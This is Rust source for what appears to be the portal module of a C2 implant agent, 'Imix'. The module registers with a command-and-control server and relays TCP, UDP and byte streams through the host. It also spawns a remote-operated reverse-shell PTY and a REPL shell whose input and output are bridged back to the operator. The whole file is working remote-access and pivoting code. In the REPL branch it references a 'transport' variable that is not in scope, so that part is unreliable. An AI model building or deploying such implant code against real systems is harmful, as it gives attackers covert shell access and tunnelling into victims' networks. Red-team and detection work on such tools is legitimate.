use anyhow::Result;
use pb::c2::{CreatePortalRequest, CreatePortalResponse};
use pb::portal::{BytesPayloadKind, Mote, mote::Payload};
use pb::trace::{TraceData, TraceEvent, TraceEventKind};
use portal_stream::{OrderedReader, PayloadSequencer};
use prost::Message;
use std::collections::HashMap;
use std::future::Future;
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::sync::mpsc;
use transport::Transport;

use super::{bytes, repl, shell, tcp, udp};
use crate::agent::ImixAgent;
use pb::c2::ReverseShellMessageKind;

/// Context for a single stream ID
struct StreamContext {
    reader: OrderedReader,
    tx: mpsc::Sender<Mote>,
}

pub async fn run<T: Transport + Send + Sync + 'static>(
    task_id: i64,
    mut transport: T,
    agent: ImixAgent<T>,
) -> Result<()> {
    let (req_tx, req_rx) = mpsc::channel::<CreatePortalRequest>(100);
    let (resp_tx, mut resp_rx) = mpsc::channel::<CreatePortalResponse>(100);

    // Start transport loop
    // Note: We use a separate task for transport since it might block or be long-running
    let transport_handle = tokio::spawn(async move {
        if let Err(e) = transport.create_portal(req_rx, resp_tx).await {
            #[cfg(debug_assertions)]
            log::error!("Portal transport error: {}", e);
        }
    });

    // Map of stream_id -> StreamContext
    // Each stream has its own OrderedReader and a sender to its handler task
    let mut streams: HashMap<String, StreamContext> = HashMap::new();

    // Map to track running tasks
    let mut tasks = Vec::new();

    // Channel for handler tasks to send outgoing motes back to main loop
    let (out_tx, mut out_rx) = mpsc::channel::<Mote>(100);

    // Send initial registration message
    if req_tx
        .send(CreatePortalRequest {
            task_id,
            mote: None,
        })
        .await
        .is_err()
    {
        return Err(anyhow::anyhow!(
            "Failed to send initial portal registration"
        ));
    }

    loop {
        tokio::select! {
            // Incoming message from C2 (via transport)
            msg = resp_rx.recv() => {
                match msg {
                    Some(resp) => {
                         #[allow(clippy::collapsible_if)]
                         if let Some(mote) = resp.mote {
                            if let Err(e) = handle_incoming_mote(mote, &mut streams, &out_tx, &mut tasks, task_id, agent.clone()).await {
                                #[cfg(debug_assertions)]
                                log::error!("Error handling incoming mote: {}", e);
                            }
                         }
                    }
                    None => {
                        // Transport closed
                        break;
                    }
                }
            }

            // Outgoing message from handler tasks
            msg = out_rx.recv() => {
                match msg {
                    Some(mote) => {
                        let req = CreatePortalRequest {
                            task_id,
                            mote: Some(mote),
                        };
                        if req_tx.send(req).await.is_err() {
                            break;
                        }
                    }
                    None => {
                        break; // All handlers closed? Unlikely.
                    }
                }
            }
        }
    }

    // Cleanup
    transport_handle.abort();
    for task in tasks {
        task.abort();
    }

    Ok(())
}

async fn handle_incoming_mote<T: Transport + Send + Sync + 'static>(
    mut mote: Mote,
    streams: &mut HashMap<String, StreamContext>,
    out_tx: &mpsc::Sender<Mote>,
    tasks: &mut Vec<tokio::task::JoinHandle<()>>,
    task_id: i64,
    agent: ImixAgent<T>,
) -> Result<()> {
    // Handle Trace Mote
    if let Some(Payload::Bytes(ref mut bytes_payload)) = mote.payload
        && bytes_payload.kind == BytesPayloadKind::Trace as i32
    {
        // 1. Add Agent Recv Event
        add_trace_event(&mut bytes_payload.data, TraceEventKind::AgentRecv)?;

        // 2. Add Agent Send Event
        add_trace_event(&mut bytes_payload.data, TraceEventKind::AgentSend)?;

        // 3. Echo back immediately
        out_tx
            .send(mote)
            .await
            .map_err(|e| anyhow::anyhow!("Failed to echo trace mote: {}", e))?;
        return Ok(());
    }

    let stream_id = mote.stream_id.clone();

    // Get or create context
    if !streams.contains_key(&stream_id) {
        #[cfg(debug_assertions)]
        log::info!("incoming mote for new stream! {stream_id} {mote:?}");

        // Create new stream context
        let (tx, rx) = mpsc::channel::<Mote>(100);
        let reader = OrderedReader::new();

        streams.insert(stream_id.clone(), StreamContext { reader, tx });

        // Spawn a generic handler that processes the first packet to decide implementation.
        let out_tx_clone = out_tx.clone();
        let stream_id_clone = stream_id.clone();
        let agent_clone = agent.clone();

        let task = tokio::spawn(async move {
            if let Err(e) =
                stream_handler(stream_id_clone, rx, out_tx_clone, task_id, agent_clone).await
            {
                #[cfg(debug_assertions)]
                log::error!("Stream handler error: {}", e);
            }
        });
        tasks.push(task);
    }

    let ctx = streams.get_mut(&stream_id).unwrap();

    // Process through OrderedReader
    // Note: OrderedReader.process is synchronous, so we can call it here.
    match ctx.reader.process(mote) {
        Ok(Some(ordered_motes)) => {
            for m in ordered_motes {
                if ctx.tx.send(m).await.is_err() {
                    // Handler closed, maybe remove stream?
                    // For now, we just ignore/log
                    #[cfg(debug_assertions)]
                    log::warn!("Stream handler closed for {}", stream_id);
                }
            }
        }
        Ok(None) => {
            // Buffered or duplicate
        }
        Err(e) => {
            // Buffer overflow or timeout
            return Err(e);
        }
    }

    Ok(())
}

fn add_trace_event(data: &mut Vec<u8>, kind: TraceEventKind) -> Result<()> {
    let mut trace_data = TraceData::decode(&data[..])?;
    let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_micros() as i64;

    trace_data.events.push(TraceEvent {
        kind: kind as i32,
        timestamp_micros: timestamp,
    });

    let mut buf = Vec::new();
    trace_data.encode(&mut buf)?;
    *data = buf;
    Ok(())
}

async fn stream_handler<T: Transport + Send + Sync + 'static>(
    stream_id: String,
    mut rx: mpsc::Receiver<Mote>,
    out_tx: mpsc::Sender<Mote>,
    task_id: i64,
    agent: ImixAgent<T>,
) -> Result<()> {
    // Wait for first message to determine type
    let first_mote = match rx.recv().await {
        Some(m) => m,
        None => return Ok(()),
    };

    let sequencer = PayloadSequencer::new(stream_id.clone());

    // Determine handler based on payload
    if let Some(payload) = &first_mote.payload {
        match payload {
            Payload::Tcp(_) => tcp::handle_tcp(first_mote, rx, out_tx, sequencer).await,
            Payload::Udp(_) => udp::handle_udp(first_mote, rx, out_tx, sequencer).await,
            Payload::Bytes(_) => bytes::handle_bytes(first_mote, rx, out_tx, sequencer).await,
            Payload::Shell(_) => {
                // Shell needs to spawn internal process and bridge IO.
                // We create channels to bridge with run_reverse_shell_pty
                let (shell_input_tx, mut shell_input_rx) = mpsc::channel::<Vec<u8>>(100);
                let (shell_output_tx, mut shell_output_rx) = mpsc::channel::<Vec<u8>>(100);

                // Spawn the Shell Logic
                use pb::c2::{ReverseShellRequest, ReverseShellResponse};

                let (pty_req_tx, mut pty_req_rx) = mpsc::channel::<ReverseShellRequest>(100);
                let (pty_resp_tx, pty_resp_rx) = mpsc::channel::<ReverseShellResponse>(100);

                // Adapter logic for PTY OUTPUT (PTY -> Mote)
                let out_tx_clone = out_tx.clone();
                let sequencer_clone = sequencer.clone();
                tokio::spawn(async move {
                    while let Some(req) = pty_req_rx.recv().await {
                        // Check kind
                        match ReverseShellMessageKind::try_from(req.kind).ok() {
                            Some(ReverseShellMessageKind::Data) => {
                                let mote = sequencer_clone.new_shell_mote(req.data);
                                if out_tx_clone.send(mote).await.is_err() {
                                    break;
                                }
                            }
                            Some(ReverseShellMessageKind::Ping) => {
                                let mote = sequencer_clone
                                    .new_bytes_mote(req.data, BytesPayloadKind::Ping);
                                if out_tx_clone.send(mote).await.is_err() {
                                    break;
                                }
                            }
                            _ => {}
                        }
                    }
                });

                // Adapter logic for PTY INPUT (Mote -> PTY)
                // This is handled by handle_shell passing to shell_input_tx
                // We need to bridge shell_input_tx to pty_resp_tx
                // But handle_shell pushes to `shell_input_tx`.
                // We need to consume `shell_input_rx` and send to `pty_resp_tx`.
                tokio::spawn(async move {
                    while let Some(data) = shell_input_rx.recv().await {
                        let resp = ReverseShellResponse {
                            kind: ReverseShellMessageKind::Data.into(),
                            data,
                        };
                        if pty_resp_tx.send(resp).await.is_err() {
                            break;
                        }
                    }
                });

                // Mock Transport
                #[derive(Clone)]
                struct ChannelTransport {
                    req_tx: mpsc::Sender<ReverseShellRequest>,
                    resp_rx: Arc<tokio::sync::Mutex<mpsc::Receiver<ReverseShellResponse>>>,
                }

                impl Transport for ChannelTransport {
                    fn init() -> Self {
                        todo!()
                    }
                    fn new(_: pb::config::Config) -> Result<Self, anyhow::Error> {
                        todo!()
                    }
                    async fn claim_tasks(
                        &mut self,
                        _: pb::c2::ClaimTasksRequest,
                    ) -> Result<pb::c2::ClaimTasksResponse, anyhow::Error> {
                        todo!()
                    }
                    async fn fetch_asset(
                        &mut self,
                        _: pb::c2::FetchAssetRequest,
                        _: std::sync::mpsc::Sender<pb::c2::FetchAssetResponse>,
                    ) -> Result<(), anyhow::Error> {
                        todo!()
                    }
                    async fn report_credential(
                        &mut self,
                        _: pb::c2::ReportCredentialRequest,
                    ) -> Result<pb::c2::ReportCredentialResponse, anyhow::Error>
                    {
                        todo!()
                    }
                    async fn report_file(
                        &mut self,
                        _: std::sync::mpsc::Receiver<pb::c2::ReportFileRequest>,
                    ) -> Result<pb::c2::ReportFileResponse, anyhow::Error> {
                        todo!()
                    }
                    async fn report_process_list(
                        &mut self,
                        _: pb::c2::ReportProcessListRequest,
                    ) -> Result<pb::c2::ReportProcessListResponse, anyhow::Error>
                    {
                        todo!()
                    }
                    async fn report_task_output(
                        &mut self,
                        _: pb::c2::ReportTaskOutputRequest,
                    ) -> Result<pb::c2::ReportTaskOutputResponse, anyhow::Error>
                    {
                        todo!()
                    }
                    async fn reverse_shell(
                        &mut self,
                        mut output_rx: mpsc::Receiver<ReverseShellRequest>,
                        input_tx: mpsc::Sender<ReverseShellResponse>,
                    ) -> Result<()> {
                        // Bridge output_rx -> req_tx
                        let req_tx = self.req_tx.clone();
                        tokio::spawn(async move {
                            while let Some(req) = output_rx.recv().await {
                                if req_tx.send(req).await.is_err() {
                                    break;
                                }
                            }
                        });

                        // Bridge resp_rx -> input_tx
                        let mut resp_rx = self.resp_rx.lock().await;
                        while let Some(resp) = resp_rx.recv().await {
                            if input_tx.send(resp).await.is_err() {
                                break;
                            }
                        }
                        Ok(())
                    }
                    async fn create_portal(
                        &mut self,
                        _: mpsc::Receiver<CreatePortalRequest>,
                        _: mpsc::Sender<CreatePortalResponse>,
                    ) -> Result<()> {
                        todo!()
                    }
                    fn get_type(&mut self) -> pb::c2::transport::Type {
                        todo!()
                    }
                    fn is_active(&self) -> bool {
                        todo!()
                    }
                    fn name(&self) -> &'static str {
                        todo!()
                    }
                    fn list_available(&self) -> Vec<std::string::String> {
                        todo!()
                    }
                }

                let transport_mock = ChannelTransport {
                    req_tx: pty_req_tx,
                    resp_rx: Arc::new(tokio::sync::Mutex::new(pty_resp_rx)),
                };

                // Spawn PTY
                let task_id_clone = task_id;
                tokio::spawn(async move {
                    let _ =
                        crate::shell::run_reverse_shell_pty(task_id_clone, None, transport_mock)
                            .await;
                });

                // Run Handler
                shell::handle_shell(first_mote, rx, out_tx, sequencer, shell_input_tx).await
            }
            Payload::Repl(_) => {
                // Similar to Shell, but with run_repl_reverse_shell
                let (repl_input_tx, mut repl_input_rx) = mpsc::channel::<Vec<u8>>(100);
                let (repl_req_tx, mut repl_req_rx) =
                    mpsc::channel::<pb::c2::ReverseShellRequest>(100);
                let (repl_resp_tx, repl_resp_rx) =
                    mpsc::channel::<pb::c2::ReverseShellResponse>(100);

                // Adapter PTY Output -> Mote
                let out_tx_clone = out_tx.clone();
                let sequencer_clone = sequencer.clone();
                tokio::spawn(async move {
                    while let Some(req) = repl_req_rx.recv().await {
                        match ReverseShellMessageKind::try_from(req.kind).ok() {
                            Some(ReverseShellMessageKind::Data) => {
                                let mote = sequencer_clone.new_repl_mote(req.data);
                                if out_tx_clone.send(mote).await.is_err() {
                                    break;
                                }
                            }
                            Some(ReverseShellMessageKind::Ping) => {
                                let mote = sequencer_clone
                                    .new_bytes_mote(req.data, BytesPayloadKind::Ping);
                                if out_tx_clone.send(mote).await.is_err() {
                                    break;
                                }
                            }
                            _ => {}
                        }
                    }
                });

                // Adapter Mote -> PTY Input
                tokio::spawn(async move {
                    while let Some(data) = repl_input_rx.recv().await {
                        let resp = pb::c2::ReverseShellResponse {
                            kind: ReverseShellMessageKind::Data.into(),
                            data,
                        };
                        if repl_resp_tx.send(resp).await.is_err() {
                            break;
                        }
                    }
                });

                // Mock Transport
                #[derive(Clone)]
                struct ChannelTransport<T: Transport> {
                    req_tx: mpsc::Sender<pb::c2::ReverseShellRequest>,
                    resp_rx: Arc<tokio::sync::Mutex<mpsc::Receiver<pb::c2::ReverseShellResponse>>>,
                    inner: T,
                }

                impl<T: Transport> Transport for ChannelTransport<T> {
                    fn init() -> Self {
                        todo!()
                    }
                    fn new(_: pb::config::Config) -> Result<Self, anyhow::Error> {
                        todo!()
                    }
                    async fn claim_tasks(
                        &mut self,
                        req: pb::c2::ClaimTasksRequest,
                    ) -> Result<pb::c2::ClaimTasksResponse, anyhow::Error> {
                        self.inner.claim_tasks(req).await
                    }
                    async fn fetch_asset(
                        &mut self,
                        req: pb::c2::FetchAssetRequest,
                        sender: std::sync::mpsc::Sender<pb::c2::FetchAssetResponse>,
                    ) -> Result<(), anyhow::Error> {
                        self.inner.fetch_asset(req, sender).await
                    }
                    async fn report_credential(
                        &mut self,
                        req: pb::c2::ReportCredentialRequest,
                    ) -> Result<pb::c2::ReportCredentialResponse, anyhow::Error>
                    {
                        self.inner.report_credential(req).await
                    }
                    async fn report_file(
                        &mut self,
                        req: std::sync::mpsc::Receiver<pb::c2::ReportFileRequest>,
                    ) -> Result<pb::c2::ReportFileResponse, anyhow::Error> {
                        self.inner.report_file(req).await
                    }
                    async fn report_process_list(
                        &mut self,
                        req: pb::c2::ReportProcessListRequest,
                    ) -> Result<pb::c2::ReportProcessListResponse, anyhow::Error>
                    {
                        self.inner.report_process_list(req).await
                    }
                    async fn report_task_output(
                        &mut self,
                        req: pb::c2::ReportTaskOutputRequest,
                    ) -> Result<pb::c2::ReportTaskOutputResponse, anyhow::Error>
                    {
                        self.inner.report_task_output(req).await
                    }
                    async fn reverse_shell(
                        &mut self,
                        mut output_rx: mpsc::Receiver<pb::c2::ReverseShellRequest>,
                        input_tx: mpsc::Sender<pb::c2::ReverseShellResponse>,
                    ) -> Result<()> {
                        // Bridge
                        let req_tx = self.req_tx.clone();
                        tokio::spawn(async move {
                            while let Some(req) = output_rx.recv().await {
                                if req_tx.send(req).await.is_err() {
                                    break;
                                }
                            }
                        });
                        let mut resp_rx = self.resp_rx.lock().await;
                        while let Some(resp) = resp_rx.recv().await {
                            if input_tx.send(resp).await.is_err() {
                                break;
                            }
                        }
                        Ok(())
                    }
                    async fn create_portal(
                        &mut self,
                        _: mpsc::Receiver<CreatePortalRequest>,
                        _: mpsc::Sender<CreatePortalResponse>,
                    ) -> Result<()> {
                        todo!()
                    }
                    fn get_type(&mut self) -> pb::c2::transport::Type {
                        self.inner.get_type()
                    }
                    fn is_active(&self) -> bool {
                        self.inner.is_active()
                    }
                    fn name(&self) -> &'static str {
                        self.inner.name()
                    }
                    fn list_available(&self) -> Vec<std::string::String> {
                        self.inner.list_available()
                    }
                }

                let transport_mock = ChannelTransport {
                    req_tx: repl_req_tx,
                    resp_rx: Arc::new(tokio::sync::Mutex::new(repl_resp_rx)),
                    inner: transport.clone(),
                };

                // Spawn REPL
                let task_id_clone = task_id;
                let agent_clone = agent.clone();
                tokio::spawn(async move {
                    let _ = crate::shell::run_repl_reverse_shell(
                        task_id_clone,
                        transport_mock,
                        agent_clone,
                    )
                    .await;
                });

                repl::handle_repl(first_mote, rx, out_tx, sequencer, task_id, repl_input_tx).await
            }
        }
    } else {
        Ok(())
    }
}
